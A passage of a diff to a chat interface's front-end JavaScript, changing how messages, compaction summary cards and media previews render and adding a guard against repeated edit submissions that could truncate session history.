   return `<details class="process-wakeup-card"><summary class="process-wakeup-summary"><span class="process-wakeup-toggle">${li('chevron-right',12)}</span><span class="process-wakeup-label">${li('terminal',13)}<span>${esc(t('process_wakeup_label'))}</span></span>${cmdHtml}${chip}${extras.timeHtml||''}</summary><div class="process-wakeup-detail">${extras.filesHtml||''}${patternRow}${cmdRow}<div class="msg-body process-wakeup-body">${outHtml}</div>${extras.footHtml||''}</div></details>`;
 }
 
+// #2051: parse into a <template> and move the nodes instead of insertAdjacentHTML —
+// every step is idempotent, so a DOM-API wrapper (e.g. an anti-fingerprinting
+// extension) that executes the call twice cannot duplicate the block.
+function _insertSegmentBlock(seg, html){
+  if(!seg) return;
+  if(typeof document!=='undefined'&&typeof document.createElement==='function'){
+    try{
+      const tpl=document.createElement('template');
+      if('content' in tpl){
+        tpl.innerHTML=html;
+        seg.appendChild(tpl.content);
+        return;
+      }
+    }catch(_){ /* fall through to the string path below */ }
+  }
+  seg.insertAdjacentHTML('beforeend', html);
+}
 function renderMessages(options){
   _lastMessageRenderAt=performance.now();
+  // typeof guard: node harnesses extract renderMessages() without its helpers (#6717).
+  if(!(options&&options._internalMeasurement) && typeof _resetMessageVirtualMeasurementBurst==='function'){ _resetMessageVirtualMeasurementBurst(); }
   const preserveScroll=!!(options&&options.preserveScroll);
   const virtualFallback=!!(options&&options._virtualFallback);
   // Capture the pre-wipe scroll position when preserving OR when the reader has
@@ -16564,8 +18401,14 @@ function renderMessages(options){
       _sessionHtmlCacheSid=sid;
       _rehydrateTransparentStreamDom(inner);
       _rehydrateDeferredWorklogsFromCache(inner);
+      if(typeof _syncExtensionMessageActionSlots==='function') _syncExtensionMessageActionSlots(inner);
       _wireMessageWindowLoadEarlierButton();
       if(typeof _applySessionNavigationPrefs==='function') _applySessionNavigationPrefs();
+      try{
+      if(typeof highlightCode==='function') highlightCode(inner);
+      if(typeof addCopyButtons==='function') addCopyButtons(inner);
+      if(typeof initTreeViews==='function') initTreeViews(inner);
+      }catch(_){ /* fail-safe: a bad block (e.g. _buildTreeDOM overflow) must not abort scroll restore, cache or the caller; the deferred pass keeps the old contained failure */ }
       _scrollAfterMessageRender(preserveScroll, scrollSnapshot);
       if(_maybeRecoverVirtualizedBlankViewport(options, preserveScroll, virtualWindow)) return;
       _updateMessageVirtualMeasurements(renderVisWithIdx, renderVisibleIdxs, virtualWindow);
@@ -16685,13 +18528,60 @@ function renderMessages(options){
     S.messages,
     sessionCompressionSummary
   );
-  const referenceText=referenceMessage
-    ? msgContent(referenceMessage)||String(referenceMessage.content||'')
-    : sessionCompressionSummary;
-  const referenceNode=(!compressionState && _shouldShowSettledCompressionReference(referenceText) && (sessionCompressionAnchor!==null || sessionCompressionAnchorKey || sessionCompressionSummary))
-    ? (()=>{const row=document.createElement('div');row.innerHTML=`<div class="compression-turn"><div class="compression-turn-blocks">${_compressionReferenceCardHtml(referenceText,false)}${_preservedCompressionTaskListCardsHtml(preservedCompressionTaskMessages)}</div></div>`;return row.firstElementChild;})()
+  const referenceText=(()=>{
+    if(!referenceMessage) return sessionCompressionSummary;
+    const raw=msgContent(referenceMessage)||String(referenceMessage.content||'');
+    const segment=_compactionSummarySegment(raw);
+    return segment!==null?segment:raw;
+  })();
+  // Ultra-compact display (2026-08-18): every compaction marker loaded in the
+  // transcript renders as its own collapsed card at its real position, so the
+  // user SEES each compaction and can reopen its digest inline. Markers older
+  // than the virtual window are pinned above the rendered rows in transcript
+  // order; markers inside the window stay inline.
+  const firstRenderedRawIdx=renderVisWithIdx.length?renderVisWithIdx[0].rawIdx:Infinity;
+  const loadedCompactionRawIdxs=(!compressionState)?_loadedCompactionMarkerRawIdxs(S.messages):[];
+  // A loaded marker that matches the current summary already renders as its
+  // own card. When none matches (referenceMessageRawIdx<0) the current summary
+  // is still authoritative and must stay visible even next to stale markers,
+  // so the settled fallback is decided here, before any card node is built,
+  // and takes part in the single preserved-task owner selection.
+  const showCurrentSummaryFallback=!!(!compressionState && referenceMessageRawIdx<0 && _shouldShowSettledCompressionReference(referenceText) && (sessionCompressionAnchor!==null || sessionCompressionAnchorKey || sessionCompressionSummary));
+  const compactionPlacements=_selectCompactionCardPlacements(loadedCompactionRawIdxs,firstRenderedRawIdx,showCurrentSummaryFallback);
+  const referenceNodeOwnsTasks=!!(showCurrentSummaryFallback
+    && compactionPlacements.taskOwner
+    && compactionPlacements.taskOwner.kind==='current-summary'
+    && preservedCompressionTaskMessages.length);
+  const _compactionCardEntry=(markerRawIdx,kind)=>{
+    const markerMsg=S.messages[markerRawIdx];
+    let raw='';
+    try{
+      raw=String(msgContent(markerMsg)||'');
+    }catch(_){
+      raw=String((markerMsg&&markerMsg.content)||'');
+    }
+    const segment=_compactionSummarySegment(raw);
+    const text=segment!==null?segment:raw;
+    const ownsTasks=!!(compactionPlacements.taskOwner
+      && compactionPlacements.taskOwner.kind===kind
+      && compactionPlacements.taskOwner.rawIdx===markerRawIdx);
+    const row=document.createElement('div');
+    row.innerHTML=`<div class="compression-turn"><div class="compression-turn-blocks">${_compressionReferenceCardHtml(text,false)}${ownsTasks?_preservedCompressionTaskListCardsHtml(preservedCompressionTaskMessages):''}</div></div>`;
+    const node=row.firstElementChild;
+    if(node){
+      node.setAttribute('data-compaction-placement',kind);
+      node.setAttribute('data-compaction-raw-idx',String(markerRawIdx));
+      if(ownsTasks&&preservedCompressionTaskMessages.length) node.setAttribute('data-compaction-task-owner','1');
+    }
+    return {node,rawIdx:markerRawIdx,kind};
+  };
+  const preWindowCompactionCards=compactionPlacements.preWindowMarkers.map(markerRawIdx=>_compactionCardEntry(markerRawIdx,'pre-window'));
+  const compactionCardNodes=compactionPlacements.inlineMarkers.map(markerRawIdx=>_compactionCardEntry(markerRawIdx,'inline'));
+  const referenceNode=showCurrentSummaryFallback
+    ? (()=>{const row=document.createElement('div');row.innerHTML=`<div class="compression-turn"><div class="compression-turn-blocks">${_compressionReferenceCardHtml(referenceText,false)}${referenceNodeOwnsTasks?_preservedCompressionTaskListCardsHtml(preservedCompressionTaskMessages):''}</div></div>`;const node=row.firstElementChild;if(node&&referenceNodeOwnsTasks) node.setAttribute('data-compaction-task-owner','1');return node;})()
     : null;
-  let preservedCompressionTaskCardsAttached=!!referenceNode;
+  let referenceNodePinnedAtTop=false;
+  let preservedCompressionTaskOwnerNode=null;
   const preservedCompressionRawIdxs=[];
   let rawIdx=0;
   for(const m of S.messages){
@@ -16699,7 +18589,6 @@ function renderMessages(options){
     if(_isPreservedCompressionTaskListMessage(m)){preservedCompressionRawIdxs.push(rawIdx);rawIdx++;continue;}
     rawIdx++;
   }
-  const firstRenderedRawIdx=renderVisWithIdx.length?renderVisWithIdx[0].rawIdx:Infinity;
   // #6999: the turn-content maps MUST see the FULL visWithIdx, not the
   // virtual render window. _assistantTurnFinalVisibleContentMap /
   // _assistantTurnVisibleContentMap derive the echo-strip context for a
@@ -16729,7 +18618,19 @@ function renderMessages(options){
       : (typeof t==='function'?t('load_older_messages'):'Load earlier messages');
     inner.appendChild(indicator);
     _wireMessageWindowLoadEarlierButton();
+    // Keep the settled compacted-context card immediately visible in a long,
+    // tail-loaded conversation. Put it in flow (not inside an old tool turn).
+    referenceNodePinnedAtTop=_pinSettledCompressionReferenceAtTop(inner,referenceNode,referenceMessageRawIdx);
+    if(referenceNodePinnedAtTop&&referenceNode?.parentElement&&referenceNodeOwnsTasks){
+      preservedCompressionTaskOwnerNode=referenceNode;
+    }
   }
+  const preWindowInsertion=_insertCompactionCardNodes(
+    preWindowCompactionCards,
+    compactionPlacements.taskOwner,
+    node=>_pinCompactionCardAtTop(inner,node)
+  );
+  if(preWindowInsertion.taskOwnerNode) preservedCompressionTaskOwnerNode=preWindowInsertion.taskOwnerNode;
   let lastUserRawIdx=-1;
   for(let i=visWithIdx.length-1;i>=0;i--){
     if(visWithIdx[i].m&&visWithIdx[i].m.role==='user'){
@@ -17016,7 +18917,8 @@ function renderMessages(options){
     const questionJumpBtn = (_qJumpTarget!==undefined&&_qJumpTarget!==null)
       ? _questionJumpButtonHtml(_qJumpTarget, assistantRawIdxByQuestionRawIdx.get(_qJumpTarget)??rawIdx)
       : '';
-    const footHtml = `<div class="msg-foot">${timeHtml}<span class="msg-actions">${editBtn}${ttsBtn}${forkBtn}${copyBtn}${retryBtn}</span>${questionJumpBtn}</div>`;
+    const extensionActionsSlot='<span class="extension-message-actions" data-extension-message-actions></span>';
+    const footHtml = `<div class="msg-foot">${timeHtml}<span class="msg-actions">${editBtn}${ttsBtn}${forkBtn}${copyBtn}${retryBtn}${extensionActionsSlot}</span>${questionJumpBtn}</div>`;
 
     if(_isContextCompactionMessage(m)){
       continue;
@@ -17205,7 +19107,7 @@ function renderMessages(options){
         if(isLastTextPart&&statusHtml){
           orderedSeg.insertAdjacentHTML('beforeend', statusHtml);
         }
-        orderedSeg.insertAdjacentHTML('beforeend', `${isLastTextPart?filesHtml:''}<div class="msg-body">${(typeof m!=='undefined'&&m&&m._media_snapshots&&typeof m._media_snapshots==='object')?_stampMediaSnapshots(partBodyHtml,m._media_snapshots):partBodyHtml}</div>${isLastTextPart?footHtml:''}`);
+        _insertSegmentBlock(orderedSeg, `${isLastTextPart?filesHtml:''}<div class="msg-body">${(typeof m!=='undefined'&&m&&m._media_snapshots&&typeof m._media_snapshots==='object')?_stampMediaSnapshots(partBodyHtml,m._media_snapshots):partBodyHtml}</div>${isLastTextPart?footHtml:''}`);
         blocks.appendChild(orderedSeg);
         if(!firstSeg) firstSeg=orderedSeg;
       });
@@ -17265,9 +19167,9 @@ function renderMessages(options){
     const hasVisibleBody=!!(String(content||'').trim()||filesHtml||recoveryHtml);
     if(statusHtml){
       seg.insertAdjacentHTML('beforeend', statusHtml);
-      if(hasVisibleBody) seg.insertAdjacentHTML('beforeend', `${filesHtml}<div class="msg-body">${bodyHtml}</div>${footHtml}`);
+      if(hasVisibleBody) _insertSegmentBlock(seg, `${filesHtml}<div class="msg-body">${bodyHtml}</div>${footHtml}`);
     }else if(hasVisibleBody){
-      seg.insertAdjacentHTML('beforeend', `${filesHtml}<div class="msg-body">${bodyHtml}</div>${footHtml}`);
+      _insertSegmentBlock(seg, `${filesHtml}<div class="msg-body">${bodyHtml}</div>${footHtml}`);
     }else if(!(thinkingText&&window._showThinking!==false&&!isSimplifiedToolCalling())){
       seg.classList.add('assistant-segment-anchor');
     }
@@ -17276,7 +19178,7 @@ function renderMessages(options){
   }
 
   function _insertCompressionLikeNode(node, anchorIndex){
-    if(!node) return;
+    if(!node) return false;
     const anchorIdx=anchorIndex===undefined?insertionAnchor:anchorIndex;
     if(anchorIdx!==null && renderVisWithIdx[anchorIdx]){
       const anchorRawIdx=renderVisWithIdx[anchorIdx].rawIdx;
@@ -17286,23 +19188,24 @@ function renderMessages(options){
         const blocks=_assistantTurnBlocks(turn);
         if(blocks){
           blocks.appendChild(node);
-          return;
+          return !!node.parentElement;
         }
       }
       const userRow=userRows.get(anchorRawIdx);
       if(userRow && userRow.parentElement){
         userRow.parentElement.insertBefore(node, userRow.nextSibling);
-        return;
+        return !!node.parentElement;
       }
     }
     inner.appendChild(node);
+    return !!node.parentElement;
   }
   function _insertCompressionLikeNodeByRawIdx(node, rawIdx){
-    if(!node) return;
-    if(rawIdx<firstRenderedRawIdx) return;
+    if(!node) return false;
+    if(rawIdx<firstRenderedRawIdx) return false;
     if(!renderVisWithIdx.length){
       inner.appendChild(node);
-      return;
+      return !!node.parentElement;
     }
     let anchorIdx=null;
     for(let i=0;i<renderVisWithIdx.length;i++){
@@ -17313,7 +19216,7 @@ function renderMessages(options){
     }
     if(anchorIdx===null){
       inner.appendChild(node);
-      return;
+      return !!node.parentElement;
     }
     const anchorRawIdx=renderVisWithIdx[anchorIdx].rawIdx;
     const anchorSeg=assistantSegments.get(anchorRawIdx);
@@ -17322,23 +19225,24 @@ function renderMessages(options){
       const blocks=_assistantTurnBlocks(turn);
       if(blocks){
         blocks.insertBefore(node, anchorSeg);
-        return;
+        return !!node.parentElement;
       }
       const turnParent=turn && turn.parentElement;
       if(turnParent){
         turnParent.insertBefore(node, turn);
-        return;
+        return !!node.parentElement;
       }
     }
     const userRow=userRows.get(anchorRawIdx);
     if(userRow && userRow.parentElement){
       userRow.parentElement.insertBefore(node, userRow);
-      return;
+      return !!node.parentElement;
     }
     inner.appendChild(node);
+    return !!node.parentElement;
   }
-  const preservedOnlyNode=(!preservedCompressionTaskCardsAttached&&(!referenceNode||compressionState)&&preservedCompressionTaskMessages.length)
-    ? (()=>{const row=document.createElement('div');row.innerHTML=`<div class="compression-turn"><div class="compression-turn-blocks">${_preservedCompressionTaskListCardsHtml(preservedCompressionTaskMessages)}</div></div>`;return row.firstElementChild;})()
+  const preservedOnlyNode=preservedCompressionTaskMessages.length
+    ? (()=>{const row=document.createElement('div');row.innerHTML=`<div class="compression-turn" data-compaction-task-fallback="1"><div class="compression-turn-blocks">${_preservedCompressionTaskListCardsHtml(preservedCompressionTaskMessages)}</div></div>`;return row.firstElementChild;})()
     : null;
   const preservedOnlyAnchor=preservedCompressionRawIdxs.length
     ? (()=>{let idx=null;for(let i=0;i<renderVisWithIdx.length;i++){if(renderVisWithIdx[i].rawIdx<preservedCompressionRawIdxs[0]) idx=i;}return idx;})()
@@ -17346,9 +19250,25 @@ function renderMessages(options){
   const handoffSummaryStates=_collectHandoffSummaryStates(S.messages);
 
   _insertCompressionLikeNode(compressionNode);
-  if(referenceNode&&referenceMessageRawIdx>=0) _insertCompressionLikeNodeByRawIdx(referenceNode, referenceMessageRawIdx);
-  else _insertCompressionLikeNode(referenceNode);
-  _insertCompressionLikeNode(preservedOnlyNode, preservedOnlyAnchor);
+  const inlineCompactionInsertion=_insertCompactionCardNodes(
+    compactionCardNodes,
+    compactionPlacements.taskOwner,
+    (node,markerRawIdx)=>_insertCompressionLikeNodeByRawIdx(node,markerRawIdx)
+  );
+  if(inlineCompactionInsertion.taskOwnerNode) preservedCompressionTaskOwnerNode=inlineCompactionInsertion.taskOwnerNode;
+  if(!referenceNodePinnedAtTop){
+    const referenceInserted=referenceNode&&referenceMessageRawIdx>=0
+      ?_insertCompressionLikeNodeByRawIdx(referenceNode,referenceMessageRawIdx)
+      :_insertCompressionLikeNode(referenceNode);
+    if(referenceInserted&&referenceNode?.parentElement&&referenceNodeOwnsTasks){
+      preservedCompressionTaskOwnerNode=referenceNode;
+    }
+  }
+  _insertPreservedCompressionTaskFallback(
+    preservedCompressionTaskOwnerNode,
+    preservedOnlyNode,
+    node=>_insertCompressionLikeNode(node,preservedOnlyAnchor)
+  );
   _insertCompressionLikeNode(handoffState?_handoffCardsNode(handoffState):null, renderVisWithIdx.length?renderVisWithIdx.length-1:null);
   for(const entry of handoffSummaryStates){
     if(!entry||!entry.state) continue;
@@ -17672,12 +19592,15 @@ function renderMessages(options){
         if(!cards.length&&!anchorReasonHtml&&!thinkingText) continue;
         const anchorTurn=anchorRow.closest('.assistant-turn');
         if(!anchorTurn) continue;
+        // Hoisted out of the `if(!state)` block below (same expression, same
+        // value) so the append path can use the ownership fact the group
+        // construction already uses.
+        const anchorIsWorklogSource=anchorRow.classList&&anchorRow.classList.contains('assistant-segment-worklog-source');
         let state=activityByTurn.get(anchorTurn);
         if(!state){
           const includeTurnDuration=!durationAssignedTurns.has(anchorTurn);
           if(includeTurnDuration) durationAssignedTurns.add(anchorTurn);
           const activityKey=`assistant:${aIdx}`;
-          const anchorIsWorklogSource=anchorRow.classList&&anchorRow.classList.contains('assistant-segment-worklog-source');
           const group=ensureActivityGroup(anchorParent,{
             collapsed:true,
             anchor:anchorRow,
@@ -17697,7 +19620,14 @@ function renderMessages(options){
         state.cards.push(...cards);
         _appendWorklogStep(state.group, anchorRow, cards, thinkingText, {
           live:false,
-          includeAnchorReason:!!includeAnchorReason&&!!anchorReasonHtml,
+          // Echo an anchor's prose as a `.wl-reason` row only when that anchor was
+          // folded into this Worklog. `assistant-segment-worklog-source` is the
+          // proof, and its `display:none` is the only reason the echo is not a
+          // second visible copy. The group construction above already reasons
+          // that way (`syncAnchorReason`); the append path did not, so an anchor
+          // that escapes the fold (the turn-final answer, an `_error` message)
+          // had its text rendered both inline and inside the Worklog.
+          includeAnchorReason:!!includeAnchorReason&&!!anchorReasonHtml&&!!anchorIsWorklogSource,
           thinkingKey:thinkingText?`thinking:${_normalizeThinkingEchoCompare(thinkingText)}`:'',
           thinkingDisclosureKey:thinkingText?`thinking:${entry.key}`:'',
           seenReasons:state.seenReasons,
@@ -17986,6 +19916,15 @@ function renderMessages(options){
       const groups=turn.querySelectorAll('.tool-worklog-group,.tool-call-group');
       let revealed=false;
       for(const group of groups){
+        // A settled Worklog whose rows are still deferred (#5839) has an empty
+        // textContent but is not empty in substance. Judging it empty here drops
+        // through to the last-resort un-hide below, and the deferred rows then
+        // materialize the same prose beside the segments it just un-hid.
+        // Materialize first, then judge.
+        if(group.getAttribute&&group.getAttribute('data-worklog-rows-deferred')==='1'
+           &&typeof _materializeDeferredWorklogRows==='function'){
+          _materializeDeferredWorklogRows(group);
+        }
         if(!(group.textContent||'').trim()) continue; // empty group can't help
         if(group.classList.contains('tool-call-group-collapsed')){
           group.classList.remove('tool-call-group-collapsed');
@@ -18104,7 +20043,17 @@ function renderMessages(options){
           // restore the whole preserved turn so nothing the user saw vanishes.
           if(S.session) _preservedLiveTurn.dataset.sessionId=S.session.session_id;
           _rebuilt.replaceWith(_preservedLiveTurn);
-        }else{
+        }else if(!(typeof _settledTranscriptOwnsLiveTurn==='function'
+                   &&_settledTranscriptOwnsLiveTurn(sid,_preservedLiveTurn))){
+          // #6948 follow-up (duplicate assistant answer; #2051): this is the
+          // only branch that ADDS a turn — the rebuild produced no live turn of
+          // its own. When the settled transcript already ends with THIS stream's
+          // own answer and the preserved node carries nothing unpersisted, the
+          // node is a dead leftover (the row persisted and the turn settled while
+          // INFLIGHT[sid] was not yet cleaned) and appending pins a SECOND copy
+          // that re-preserves itself on every later render until a reload.
+          // Mid-stream the transcript ends with the user turn (or still carries a
+          // live projection), so #3877 preservation is untouched.
           if(S.session) _preservedLiveTurn.dataset.sessionId=S.session.session_id;
           inner.appendChild(_preservedLiveTurn);
         }
@@ -18115,6 +20064,21 @@ function renderMessages(options){
   // (tool completion, session switch) must not override the user's scroll position.
   // scrollIfPinned() respects _scrollPinned, so it's a no-op if user scrolled up.
   if(typeof _syncLiveRunStatusAfterRender==='function') _syncLiveRunStatusAfterRender();
+  // Reconcile extension message-action slots BEFORE the cache snapshot so the cached
+  // HTML carries the reconciled attribute-bound buttons (same contract as before #7752).
+  if(typeof _syncExtensionMessageActionSlots==='function') _syncExtensionMessageActionSlots(inner);
+  // Snapshot only when this render can be cached (same gate as the .set below): mid-stream
+  // and transient-card renders must not pay a whole-transcript serialization they discard.
+  let cacheHtml='';
+  if(sid&&!INFLIGHT[sid]&&!hasTransientTranscriptUi){ cacheHtml=inner.innerHTML; }
+  // Synchronously highlight code blocks, initialize structured tree views, and attach
+  // copy buttons BEFORE the frame is painted so virtualized transcripts do not paint
+  // unhighlighted raw text for one frame when scrolled into view (#7752).
+  try{
+  if(typeof highlightCode==='function') highlightCode(inner);
+  if(typeof addCopyButtons==='function') addCopyButtons(inner);
+  if(typeof initTreeViews==='function') initTreeViews(inner);
+  }catch(_){ /* fail-safe: a bad block (e.g. _buildTreeDOM overflow) must not abort scroll restore, cache or the caller; the deferred pass keeps the old contained failure */ }
   _scrollAfterMessageRender(preserveScroll, scrollSnapshot);
   if(_maybeRecoverVirtualizedBlankViewport(options, preserveScroll, virtualWindow)) return;
   // Apply syntax highlighting after DOM is built
@@ -18136,9 +20100,9 @@ function renderMessages(options){
   // the helper) working — absent helper == not armed == cache normally.
   const _keepOpenArmed=(typeof _isKeepSettledWorklogOpenArmed==='function')&&_isKeepSettledWorklogOpenArmed();
   if(sid&&!INFLIGHT[sid]&&!hasTransientTranscriptUi&&!_keepOpenArmed){
-    const _html=inner.innerHTML;
+    const _html=cacheHtml;
     // Only cache sessions with <300KB rendered HTML; evict oldest beyond 8 sessions.
-    if(_html.length<300_000){
+    if(_html&&_html.length<300_000){
       const renderSignature=cachedRenderSignature===null?_messageRenderCacheSignature():cachedRenderSignature;
       _sessionHtmlCache.set(sid,{html:_html,msgCount,renderWindowKey,signature:renderSignature});
       if(_sessionHtmlCache.size>8){_sessionHtmlCache.delete(_sessionHtmlCache.keys().next().value);}
@@ -19250,66 +21214,88 @@ function autoResizeTextarea(ta) {
   ta.style.height = Math.min(ta.scrollHeight, 300) + 'px';
 }
 
+// #2184 follow-up: submitEdit is re-entrant and destructive, and nothing stopped
+// a second invocation. Its only guard was S.busy, which send() does not set until
+// the LAST line — after two multi-second awaits (_ensureAllMessagesLoaded on a long
+// session, then the truncate round-trip). On a laggy instance that leaves a 10s+
+// window in which every further click on "Send edit" starts another full truncate.
+// Observed in the wild: seven concurrent POST /api/session/truncate, 5.2-8.5s each,
+// from one user clicking repeatedly because the UI had not yet acknowledged the first.
+//
+// That is not merely wasteful, it is a data-loss hazard. `absoluteKeepCount` is
+// deliberately captured BEFORE the awaits (see test_submit_edit_captures_absolute_
+// before_await): at click time `_oldestIdx` is the loaded window's offset and
+// `msgIdx` is window-relative, so their sum is the true absolute index. But the
+// first call's _ensureAllMessagesLoaded() sets `_oldestIdx = 0`, so a SECOND call
+// entering afterwards computes `0 + msgIdx` from a still-window-relative msgIdx —
+// a far smaller keep_count. Truncating a 2000-message session to that would delete
+// most of its history.
+//
+// Guard re-entry at the function itself rather than at the click handler: the edit
+// can also be submitted with Enter (the keydown handler clicks the button), and a
+// future caller would silently reopen the hole. Cleared in a finally so an early
+// return or a throw cannot wedge editing off for the rest of the page's life.
+let _submitEditInFlight = false;
 async function submitEdit(msgIdx, newText) {
-  if(!S.session || S.busy) return;
-  const initialSid = S.session.session_id;
-  const absoluteKeepCount = _oldestIdx + msgIdx;
-  // #5924: capture the deliberate-pick signal up front (pre-network), scoped to
-  // initialSid — a non-default session model (vs profile default), which is
-  // inference-free and survives the failed send's marker consumption. See
-  // _deliberateSessionModelPick. null → no re-arm → server resolution runs.
-  const _recoveryPick=_deliberateSessionModelPick(initialSid);
-  if(typeof _ensureAllMessagesLoaded==='function'){
-    await _ensureAllMessagesLoaded();
-  }
-  if(!S.session || S.session.session_id !== initialSid) return;
+  if(!S.session || S.busy || _submitEditInFlight) return;
+  _submitEditInFlight = true;
   try {
-    await api('/api/session/truncate', {method:'POST', body:JSON.stringify({
-      session_id: initialSid,
-      keep_count: absoluteKeepCount
-    })});
-    // #5924 SILENT-race guard: a session switch during the truncate await must not
-    // let this recovery apply session A's intent (truncate/re-arm/send) to the
-    // newly-visible session.
+    const initialSid = S.session.session_id;
+    const absoluteKeepCount = _oldestIdx + msgIdx;
+    // #5924: capture the deliberate-pick signal up front (pre-network), scoped to
+    // initialSid — a non-default session model (vs profile default), which is
+    // inference-free and survives the failed send's marker consumption. See
+    // _deliberateSessionModelPick. null → no re-arm → server resolution runs.
+    const _recoveryPick=_deliberateSessionModelPick(initialSid);
+    if(typeof _ensureAllMessagesLoaded==='function'){
+      await _ensureAllMessagesLoaded();
+    }
     if(!S.session || S.session.session_id !== initialSid) return;
-    S.messages = S.messages.slice(0, absoluteKeepCount);
-    renderMessages();
-    $('msg').value = newText;
-    // #5924 (Facet 1 + Facet 4): edit-resubmit is a recovery send. Re-arm the
-    // Re-arm the single-shot explicit-pick marker from the captured non-default
-    // pick — only if still safe at fire time (session unchanged, current model
-    // still matches, no newer onchange marker to clobber). See _reArmRecoveryPick.
-    _reArmRecoveryPick(initialSid, _recoveryPick);
-    await send();
-  } catch(e) { setStatus(t('edit_failed') + e.message); }
+    try {
+      await api('/api/session/truncate', {method:'POST', body:JSON.stringify({
+        session_id: initialSid,
+        keep_count: absoluteKeepCount
+      })});
+      // #5924 SILENT-race guard: a session switch during the truncate await must not
+      // let this recovery apply session A's intent (truncate/re-arm/send) to the
+      // newly-visible session.
+      if(!S.session || S.session.session_id !== initialSid) return;
+      S.messages = S.messages.slice(0, absoluteKeepCount);
+      renderMessages();
+      $('msg').value = newText;
+      // #5924 (Facet 1 + Facet 4): edit-resubmit is a recovery send. Re-arm the
+      // Re-arm the single-shot explicit-pick marker from the captured non-default
+      // pick — only if still safe at fire time (session unchanged, current model
+      // still matches, no newer onchange marker to clobber). See _reArmRecoveryPick.
+      _reArmRecoveryPick(initialSid, _recoveryPick);
+      await send();
+    } catch(e) { setStatus(t('edit_failed') + e.message); }
+  } finally {
+    _submitEditInFlight = false;
+  }
 }
 
 async function regenerateResponse(btn) {
   if(!S.session || S.busy) return;
-  const row = btn.closest('[data-msg-idx]');
-  if(!row) return;
-  const assistantIdx = parseInt(row.dataset.msgIdx, 10);
-  const absoluteKeepCount = _oldestIdx + assistantIdx;
+  const row=btn&&btn.closest&&btn.closest('[data-msg-idx]');
+  if(!row)return;
+  const clickedAbsoluteIndex=_oldestIdx+parseInt(row.dataset.msgIdx,10);
   const initialSid = S.session.session_id;
-  let lastUserText = '';
-  for(let i = assistantIdx - 1; i >= 0; i--) {
-    const m = S.messages[i];
-    if(m && m.role === 'user') { lastUserText = msgContent(m); break; }
-  }
-  if(!lastUserText) return;
   if(typeof _ensureAllMessagesLoaded==='function'){
     await _ensureAllMessagesLoaded();
   }
   if(!S.session || S.session.session_id !== initialSid) return;
+  if(!S.session.regeneration_revision){ setStatus(t('regen_failed')); return; }
+  let latestAssistantIndex=-1;
+  for(let i=S.messages.length-1;i>=0;i--){
+    if(S.messages[i]?.role==='assistant'){latestAssistantIndex=i;break;}
+  }
+  if(clickedAbsoluteIndex!==latestAssistantIndex){
+    setStatus(t('regen_failed'));
+    return;
+  }
   try {
-    await api('/api/session/truncate', {method:'POST', body:JSON.stringify({
-      session_id: initialSid,
-      keep_count: absoluteKeepCount
-    })});
-    S.messages = S.messages.slice(0, absoluteKeepCount);
-    renderMessages();
-    $('msg').value = lastUserText;
-    await send();
+    await startRegeneration(initialSid, S.session.regeneration_revision);
   } catch(e) { setStatus(t('regen_failed') + e.message); }
 }
 
@@ -19583,8 +21569,8 @@ function loadDiffInline(container){
   root.querySelectorAll('.diff-inline-load:not([data-loaded])').forEach(el=>{
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
-    const snapQuery=_mediaSnapQuery(el);
-    fetch('api/media?path='+encodeURIComponent(path)+snapQuery)
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    fetch(_mediaPreviewUrl(path,{snap:snap||undefined}))
       .then(r=>{if(!r.ok) throw new Error(r.status);return r.text();})
       .then(text=>{
         if(text.length>DIFF_MAX_SIZE){
@@ -19622,11 +21608,16 @@ function _mediaSnapQuery(el){
   return (snap&&/^[0-9a-f]{64}$/.test(snap))?('&snap='+snap):'';
 }
 
-function _csvMediaUrl(path, opts={}){
+function _mediaPreviewUrl(path, opts={}){
   let url='api/media?path='+encodeURIComponent(path)+_mediaSessionQuery();
   if(opts.snap) url+='&snap='+encodeURIComponent(opts.snap);
+  if(opts.inline) url+='&inline=1';
   if(opts.download) url+='&download=1';
   return url;
+}
+
+function _csvMediaUrl(path, opts={}){
+  return _mediaPreviewUrl(path, opts);
 }
 
 function buildCsvTablePreview(path, text, downloadUrl=''){
@@ -19653,9 +21644,8 @@ function buildCsvTablePreview(path, text, downloadUrl=''){
   };
 }
 
-function _csvPreviewErrorHtml(path, errorKey){
+function _csvPreviewErrorHtml(path, errorKey, downloadUrl=_csvMediaUrl(path,{download:true})){
   const fname=path.split('/').pop()||path;
-  const downloadUrl=_csvMediaUrl(path,{download:true});
   return `<div class="diff-inline-error">${esc(fname)}<br><a class="msg-media-link" href="${esc(downloadUrl)}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t(errorKey)}</span></div>`;
 }
 
@@ -19671,10 +21661,10 @@ function loadCsvInline(container){
       .then(r=>{if(!r.ok) throw new Error(r.status);return r.text();})
       .then(text=>{
         const preview=buildCsvTablePreview(path, text, downloadUrl);
-        el.outerHTML=preview.html||_csvPreviewErrorHtml(path, preview.errorKey||'csv_error');
+        el.outerHTML=preview.html||_csvPreviewErrorHtml(path, preview.errorKey||'csv_error', downloadUrl);
       })
       .catch(()=>{
-        el.outerHTML=_csvPreviewErrorHtml(path, 'csv_error');
+        el.outerHTML=_csvPreviewErrorHtml(path, 'csv_error', downloadUrl);
       });
   });
 }
@@ -19685,8 +21675,9 @@ function loadExcalidrawInline(container){
   root.querySelectorAll('.excalidraw-inline-load:not([data-loaded])').forEach(el=>{
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
-    const snapQuery=_mediaSnapQuery(el);
-    fetch('api/media?path='+encodeURIComponent(path)+snapQuery)
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    const downloadUrl=_mediaPreviewUrl(path,{download:true,snap:snap||undefined});
+    fetch(_mediaPreviewUrl(path,{snap:snap||undefined}))
       .then(r=>{if(!r.ok) throw new Error(r.status);return r.text();})
       .then(text=>{
         if(text.length>EXCALIDRAW_MAX_SIZE){
@@ -19704,7 +21695,6 @@ function loadExcalidrawInline(container){
           return;
         }
         const fname=esc(path.split('/').pop());
-        const downloadUrl='api/media?path='+encodeURIComponent(path)+'&download=1';
         el.outerHTML=`<div class="excalidraw-embed-wrap" title="${t('excalidraw_simplified')}">
   <div class="msg-artifact-header">
     <span class="msg-media-label">${t('excalidraw_label')}</span>
@@ -19814,16 +21804,15 @@ function loadPdfInline(container){
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
     const fname=path.split('/').pop()||path;
-    const mediaSessionId=(typeof S!=='undefined'&&S&&S.session&&S.session.session_id)?String(S.session.session_id):'';
